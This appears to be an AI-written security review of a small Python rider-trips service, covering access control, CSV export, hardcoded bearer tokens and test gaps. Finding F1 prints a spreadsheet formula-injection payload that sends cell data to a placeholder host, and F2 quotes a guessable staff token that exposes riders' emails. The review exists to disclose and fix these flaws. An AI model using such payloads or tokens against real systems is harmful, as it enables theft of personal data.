**Same-context review; anchoring risk; re-run in a fresh session for anything high-stakes.** No subagent or tools were available, so nothing below was executed. Every trace was done by reading the code.

VERDICT: **SHIP WITH FIXES**. The access control matches the request: 401 comes before 403, and every staff data path sits behind `require_staff`. Two Medium weaknesses should be fixed before production: the CSV export is built without escaping, and bearer tokens are hardcoded in source.
CONFIDENCE: **medium**. It is limited by the same-context review, by having no tools (tests not run, no mutation checks), and by not knowing whether `auth._TOKENS` and `trips._TRIPS` are stand-ins for real stores.

**INPUTS LEDGER**
- Seen: request.md, context.md, app.py, auth.py, trips.py, test_app.py.
- Not seen:
  - The real token issuance and storage. This matters for F2 and S2.
  - Where rider names come from, and whether they are unique. This matters for S1 and F1.
  - The HTTP layer that serializes `body` and sets content types. This matters for S3.
  - The test run output behind "7 tests pass". This matters little, because tracing says all 7 pass.

**COVERAGE**
- Checked:
  - `app.py:handle`, including every branch.
  - `auth.py:current` and `auth.py:require_staff`.
  - `trips.py:for_rider`, `all_rows` and `as_csv`.
  - All 7 tests in `test_app.py`, each traced to pass.
  - Hostile inputs: a `None` token, an `int` token, a `bytes` token, a non-ASCII token, a missing `path`, and path variants (`/staff`, `/staff/x`, `/STAFF/...`, `//staff/...`, `?query`, a trailing slash).
- Not checked: the HTTP and serialization layer, the real token store, the rider data source, and runtime test results.

**SEATS AND GATE**
- Only a same-context Claude review ran. No subagent was available.
- Gate: the source contains bearer credentials (`auth.py:4`), and the request describes rider names and emails as personal data. Cross-vendor seats would therefore be refused, and none were used.

### FINDINGS

| # | Severity | Evidence | Track | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|---|
| F1 | Medium | CONFIRMED | B | `trips.py:21-23` (`as_csv`) | The CSV is built with f-strings and has no quoting or escaping. | **Malformed rows:** a rider named `Smith, Jr.` gets an extra column, so the email lands under `bike`. **Formula injection:** a rider-controlled name like `=HYPERLINK("http://x/?"&B2)` runs as a formula when staff open the export in a spreadsheet. | **Fix:** use `csv.writer` over `io.StringIO`. Prefix cells starting with `= + - @` with `'`. **Repro:** append `{"rider":"a,b","email":"e@x","bike":"B","km":1}` to `_TRIPS`, then call `as_csv()`. Parsing it with `csv.reader` gives 5 fields; 4 are expected. | a✓ b✓ c✗ d✗ |
| F2 | Medium | CONFIRMED | B | `auth.py:5` (`_TOKENS`) | Static, guessable bearer tokens (`tok-<name>`) are committed in source and include staff tokens. | Anyone with repo read access, or anyone who guesses `tok-ola`, can call `/staff/trips.csv` and get every rider's name and email. Rotating a token needs a code deploy. | **Fix:** load tokens, or their hashes, from a secret store or config at runtime. Use high-entropy values and remove literals from the repo. **Repro:** `get("/staff/trips.csv","tok-ola")` returns 200 using only strings visible in the source. | a✓ b✓ c✗ d✗ |
| F3 | Low | CONFIRMED | B | `test_app.py:18-19`, `:10-11` | Several test gaps. The JSON export test asserts status only. No test covers 401 on a `/staff` route. No test covers a rider on an unlisted `/staff/*` path. | A regression where `all_rows()` returns `[]` or drops emails still passes. Moving the auth call below the staff branch would not be caught on `/staff` routes. | **Add tests:** (1) `get("/staff/trips.json","tok-sam")` has a body with 3 rows that includes `tomas@example.test`. (2) `get("/staff/trips.csv", None)` gives 401. (3) `get("/staff/anything","tok-rita")` gives 403. **Mutation check:** set `all_rows` to return `[]` and confirm the current suite stays green. | a✓ b✓ c✗ d✗ |
| F4 | Low | CONFIRMED | B | `app.py:12` | `request["path"]` raises `KeyError` when `path` is missing. The error comes after authentication, so it reaches whatever generic error handler the framework has. | An authenticated malformed request crashes the handler instead of returning a 4xx. | **Fix:** use `request.get("path")` and return 400 or 404 when it is absent. **Repro:** `app.handle({"token":"tok-sam"})` raises `KeyError`. | a✓ b✓ c✗ d✗ |

### NEEDS VALIDATION
- **S1 (`trips.py:11`, `app.py:14`).** Riders are matched by display name (`t["rider"] == ident[0]`), not by a unique ID. If two riders can share a name, each sees the other's trips and emails. *Settling fact:* is `ident[0]` a unique, immutable account key?
- **S2 (`auth.py:5`).** Is `_TOKENS` the production token store or a fixture? If it is production, F2 rises to at least High.
- **S3 (`app.py:21`).** Does the HTTP layer serialize the list body to JSON and set `Content-Type` for both exports? Does it add `Cache-Control: no-store` for responses carrying personal data? *Settling fact:* the framework or adapter code.
- **S4 (path normalization upstream).** Does any upstream layer decode or normalize paths? Exact matching fails closed (404) here, but a proxy rewrite could change which branch is hit. *Settling fact:* the router or proxy config.

### REFUTED
- **"No token on a /staff route returns 403 instead of 401."** `auth.current` runs before any path check (`app.py:8-11`), so every route gives 401 first.
- **"Staff check can be bypassed via path variants."** `all_rows` and `as_csv` are only reachable inside the `startswith("/staff/")` branch, after `require_staff`. Variants such as `/STAFF/...`, `//staff/...` and `...?x=1` fall through to 404.
- **"Non-ASCII token makes `compare_digest` raise TypeError."** The token is encoded to UTF-8 bytes first (`auth.py:15`). Non-`str` input becomes `b""`, which matches nothing and gives 401.
- **"Timing leak in token comparison."** Each comparison is constant-time. The early return only shows which entry matched after a match has happened, so it does not leak token contents.

### WHAT HOLDS UP
- **Status ordering.** Unauthenticated requests get 401 on every path, including `/staff/*` and unknown paths. Riders get 403 on everything under `/staff/`, including unlisted paths, which fits "everything under /staff is for staff only".
- **Rider scoping.** `/trips` is scoped to the caller. The rider test is non-vacuous (`body and all(...)`).
- **Copies, not references.** Rows are returned as copies (`dict(t)`), so callers cannot mutate the store.
- **Odd tokens.** `None`, `int` and `bytes` tokens all fail closed with 401.

### UNVERIFIED CLAIMS
- **"7 tests in test_app.py pass."** Tracing says all 7 pass, but nothing was run. To confirm, run `python3 -m unittest test_app -v`.
- **Mutation sensitivity of the suite.** Confirm in a scratch copy:
  - Remove the `require_staff` call: the two 403 tests should fail.
  - Set `for_rider` to return `all_rows()`: the rider test should fail.
  - Set `all_rows` to return `[]`: this is expected to stay green, which is F3.

### QUESTIONS FOR THE AUTHOR
1. Is `_TOKENS` what production will use (S2/F2)?
2. Is a rider's name a unique account key (S1)?
3. Can riders set their own display names (F1 severity)?

### DECISION-MAKER SUMMARY
The access rules are implemented correctly, and no path gives a rider or anonymous caller the staff exports. Before production, replace the hardcoded tokens with a real secret store and build the CSV with proper escaping. Also confirm that rider names are unique IDs. If that is not checked, riders who share a name could see each other's emails.

### OWNER SUMMARY
The new system correctly keeps riders out of the staff-only reports and shows each rider only their own trips. Two things need fixing before launch: the login keys are written directly into the code where anyone with code access can see them, and the spreadsheet export can be corrupted or abused by unusual names. We also need to confirm that two riders with the same name can never see each other's trips.

```json
{
  "schema_version": "2.2",
  "verdict": "SHIP WITH FIXES",
  "confidence": "medium",
  "inputs_ledger": [
    {"item": "request.md", "status": "seen", "matters": true},
    {"item": "context.md", "status": "seen", "matters": true},
    {"item": "app.py", "status": "seen", "matters": true},
    {"item": "auth.py", "status": "seen", "matters": true},
    {"item": "trips.py", "status": "seen", "matters": true},
    {"item": "test_app.py", "status": "seen", "matters": true},
    {"item": "production token store", "status": "not_seen", "matters": true},
    {"item": "rider identity/data source", "status": "not_seen", "matters": true},
    {"item": "HTTP serialization layer", "status": "not_seen", "matters": false},
    {"item": "test run output", "status": "not_seen", "matters": false}
  ],
  "seats": [{"vendor": "claude-same-context", "status": "ran", "cross_vendor": false}],
  "sensitivity_gate": {"sensitive": true, "reason": "Source contains bearer tokens and the system handles rider names/emails; no external seats used."},
  "coverage": {
    "checked": [
      {"unit": "app.py", "kind": "file"},
      {"unit": "app.py:handle", "kind": "function"},
      {"unit": "auth.py", "kind": "file"},
      {"unit": "auth.py:current", "kind": "function"},
      {"unit": "auth.py:require_staff", "kind": "function"},
      {"unit": "trips.py", "kind": "file"},
      {"unit": "trips.py:as_csv", "kind": "function"},
      {"unit": "test_app.py", "kind": "file"}
    ],
    "not_checked": [
      {"unit": "HTTP/serialization layer", "reason": "not supplied"},
      {"unit": "production token store", "reason": "not supplied"},
      {"unit": "test execution and mutation checks", "reason": "no tools in session"}
    ]
  },
  "findings": [
    {"id": "F1", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "trips.py:21-23",
     "scenario": "A rider name containing a comma shifts columns in the staff CSV; a name starting with '=' runs as a spreadsheet formula when staff open the export.",
     "fix": "Build the CSV with csv.writer over io.StringIO and prefix cells starting with = + - @ with a single quote.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Add a trip with rider 'a,b' and parse as_csv() with csv.reader; expect 4 fields per row, observe 5."},
    {"id": "F2", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "auth.py:5",
     "scenario": "Anyone with repo access or who guesses the tok-<name> pattern uses a staff token to download every rider's name and email.",
     "fix": "Load high-entropy tokens (or their hashes) from a secret store at runtime and remove literals from source.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "get('/staff/trips.csv', 'tok-ola') returns 200 using only strings visible in the source."},
    {"id": "F3", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "test_app.py:18-19",
     "scenario": "A regression where all_rows() returns [] or drops emails, or where auth moves below the staff branch, passes the suite.",
     "fix": "Assert the JSON export body has all 3 rows with emails; add 401-on-/staff and rider-403-on-/staff/anything tests.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "In a scratch copy set all_rows to return []; the current 7 tests stay green."},
    {"id": "F4", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "app.py:12",
     "scenario": "An authenticated request without a 'path' key raises KeyError instead of returning a 4xx.",
     "fix": "Use request.get('path') and return 400/404 when absent.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "app.handle({'token': 'tok-sam'}) raises KeyError; expect a 4xx response."},
    {"id": "S1", "status": "needs_validation", "track": "B", "location": "trips.py:11",
     "suspicion": "Rider trips are matched by display name; two riders sharing a name would see each other's trips and emails.",
     "unresolved_fact": "Whether ident[0] is a unique, immutable account key."},
    {"id": "S2", "status": "needs_validation", "track": "B", "location": "auth.py:5",
     "suspicion": "Hardcoded _TOKENS may be the production credential store.",
     "unresolved_fact": "Whether production loads tokens from elsewhere."},
    {"id": "S3", "status": "needs_validation", "track": "B", "location": "app.py:21",
     "suspicion": "List body may not be serialized to JSON, and PII responses may lack content-type or no-store headers.",
     "unresolved_fact": "The HTTP adapter code that wraps handle()."},
    {"id": "S4", "status": "needs_validation", "track": "B", "location": "app.py:15",
     "suspicion": "Upstream path normalization could change which branch is reached.",
     "unresolved_fact": "Router/proxy path rewriting configuration."}
  ],
  "refuted": [
    {"id": "R1", "candidate": "No token on a /staff route returns 403 instead of 401.", "evidence": "auth.current runs before any path check at app.py:8-11."},
    {"id": "R2", "candidate": "Staff check bypass via path variants.", "evidence": "all_rows/as_csv are only reachable inside the /staff/ branch after require_staff; variants fall through to 404."},
    {"id": "R3", "candidate": "Non-ASCII token makes compare_digest raise TypeError.", "evidence": "auth.py:15 encodes str to UTF-8 bytes; non-str becomes b''."},
    {"id": "R4", "candidate": "Timing leak in token comparison.", "evidence": "Each comparison is constant-time; the early return reveals nothing about token contents."}
  ]
}
```